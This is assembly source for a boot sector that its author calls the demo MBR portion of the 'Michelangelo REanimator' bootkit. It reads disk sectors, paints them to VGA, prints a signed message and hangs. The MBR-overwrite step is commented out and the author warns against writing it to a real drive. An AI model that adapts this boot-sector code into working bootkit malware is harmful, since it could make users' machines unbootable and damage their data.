bits 16
;.286			;masm specific
;.MODEL TINY		;masm specific

;;******************************************************************************
;	This is the working demo of the malicious MBR/boot sector portion
; 	of the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a "functional" boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -hda michelange_grafx_routines.mbr
;
;
;******************************************************************************

.CODE:
;	org 100h
org 0x7C00

;******************************************************************************

SCREEN_MAX			equ	320*200
SCREEN_WIDTH		equ	0x140							;;320
SCREEN_HEIGHT		equ	0xC8							;;200
;SCALED_SCREEN_MAX	equ	0x280*SCALE_MULTIPLIER
SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
SCALED_SCREEN_W		equ	0x20*SCALE_MULTIPLIER			;;320 / 10
SCALED_SCREEN_H		equ	0x14*SCALE_MULTIPLIER			;;200 / 10 
MBRSPRITE_W			equ	0x100							;;256
MBRSPRITE_AREA		equ	0x7D00							;;320 / * MBRSPRITE_W
NEWSPRITE_AREA		equ	0x2800*SCALE_MULTIPLIER			;;320 / * MBRSPRITE_W
VGA_PAL_INDEX		equ	0x3C8
VGA_PAL_DATA		equ	0x3C9
MBR_SIZE			equ 0x200
SCALE_MULTIPLIER	equ 4
;******************************************************************************

;BUF equ $+200
;BUF equ 0x7E00
;VXPaintBuffer equ $-VXend+0x200
;VXPaintBuffer equ 0x7e00
;VXPaintBuffer: dw 0
;0x7A00

VX_BOOT:
cli
xor 	ax,ax
mov 	ds,ax
mov 	es,ax
mov 	ss,ax
mov		ax, 0x7C00
mov		sp, ax
sti

load_vx_paint:
	mov ax, 0x0		;reset disk
	int 13h

	push cs
	pop es
	;mov ax, 0x07e0
	;mov es, ax
	mov bx, 0x7e00
	;mov bx, 0x200
	;xor bx, bx
	mov [VXPaintBuffer], bx
	mov [VXPaintBuffer+2], es

	mov ax, 0x214	;read twenty sectors of disk
	mov ch, 0
	;mov	cl, 0xD	;cylinder 0, sector 13 (0xD)
	mov	cl, 0x3	;cylinder 0, sector 3 (0x3)
	;mov dx, 0x80 	;from Side 0, drive C:
	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
	mov bx, VXPaintBuffer
;	lea bx, VXPaintBuffer		;to buffer BUF in DS
	int 13h

;******************************************************************************
;	Write back to hard disk drive C: sector 1 (MBR)
;******************************************************************************
	;mov ax,0x030A
	;lea bx, MichelAngeBitmap 
	;int 13h

vga_init:
	mov	ax,0xA000
	;mov	ax,0xB800
	mov	es,ax
	mov	dx,ax
	mov	di,0
	mov	ax, 0x13
	int	10h
	cld
;	jmp paint_setup

gen_rand_num:
	push ax
	push es
	xor ax, ax
	mov es,ax
	mov ax, es:[46Ch] ;offset of var for internal timer in BPB
	mov [randtimer], al
	mov [randshiftnum], ah
	pop es
	pop ax
	cmp word [randtimer], 6
	jge gen_rand_shifts
	mov [randshift0], ax
	jmp paint_setup
	;jmp set_pal

gen_rand_shifts:
	push ax
	mov ax, [randtimer]
	add ax, [randshiftnum]
	mov [randshift0], ax
	pop ax
	jmp paint_setup
;;	randshift0 equ (randtimer+randshiftnum)

set_pal:
	salc				;set carry flag in al, if carry flag set, al=0
	mov	dx,VGA_PAL_INDEX	;
	out	dx, al
	inc	dx
	pal_1:
		;or ax, [randshift0]
		or	ax,0000111100110011b
		push	ax
		shr	ax, 10
		;shr	ax, randshift0
		out	dx,al
		mul	al
		;shl	ax, randshift1
		shl	ax, 6
		out 	dx,al
		pop	ax
		out	dx,al
		inc	ax
		jnz	pal_1
	;jmp 	bmp_setup


paint_setup:
	mov cx, 8
;	mov	cx, SCALED_SCREEN_W
	xor di, di
	paint_loop:
		push 	di
		push	cx
		mbr_paint:
			;lea si, MichelAngeBitmap
			;mov si, VXPaintBuffer
			
			push cs
			pop ds
			
			;mov ax, 0x07e0
			;mov ds, ax
			;xor si, si
			
			mov si, 0x7E00
			;lea si, VXPaintBuffer
			;mov si, 0x400
			push si
			mov bx, SCALED_SCREEN_MAX
			vga_mbr_y:
				push di
				mov dx, SCALED_SCREEN_W
				vga_mbr_x:
					mov ax, ds:[si]
					;mov ax, [si]
					or al, es:[di]
					add al, 0x01
					;add al, [randtimer]
					;add al, [randshiftnum]
					mov es:[di], al 
					mov es:[di+2], al 
					inc si
					;inc di
					add di, 4
					dec dx
					jnz vga_mbr_x
				pop di
				add di, 320
				dec bx
				jnz vga_mbr_y
			pop si
		pop		cx
		pop 	di
		add		di, NEWSPRITE_AREA
		dec 	cx
		jnz	paint_loop


rsvp:
	mov cx, greetz_len
	mov si, greetz
	push cs
	pop ds
welcome:
	mov al, [si]
	mov bh, 0
	;mov bl, $-randtimer
	mov bl, 0x0F
	mov ah, 0x0E
	int 0x10
	inc si
	dec cx
	jnz welcome
	jmp key_check

randtimercheck:
	mov cx, 2
	mov si, randtimer
	push cs
	pop ds
randtimerprint:
	mov al, [si]
	mov bh, 0
	;mov bl, $-randtimer
	mov bl, 0x0F
	mov ah, 0x0E
	int 0x10
	inc si
	dec cx
	jnz randtimerprint
	jmp key_check

;******************************************************************************
;
;	Reads char from buffer (function 0h,int16h)
; 	Char returned in al
; 	If char in al == 0x1b (ESC) then terminate program
;	Else, continue VGA *~pretty picture~* loop
;
;******************************************************************************
key_check:
	xor	ax,ax
	int	16h
	;;check for keypress
	cmp	al, 1
	jnz	baibai
;******************************************************************************
;
;	Terminates program (function 4Ch,int21h)
;
;******************************************************************************
baibai:	
	jmp baibai
	;mov	ax,4C00h		;terminate program
	;int	21h

greetz:
	db "u know u luv me.", 0Dh, 0Ah
	db "xoxo", 0Dh, 0Ah
	db "ic3qu33n", 0Dh, 0Ah

greetz_len	equ $-greetz
	
randtimer:
	db 0
randshiftnum:
	db 0
randshift0:
	db 0

;randshift1 equ (randshift0 - 2)
	
VXend:
	times 510-($-$$) db 0
	db 0x55
	db 0xAA

.data:
;org 0x7e00
;VXPaintBuffer equ  $-0x7e00
VXPaintBuffer: 
	dw 0
	times 10240-($-$$) db 0

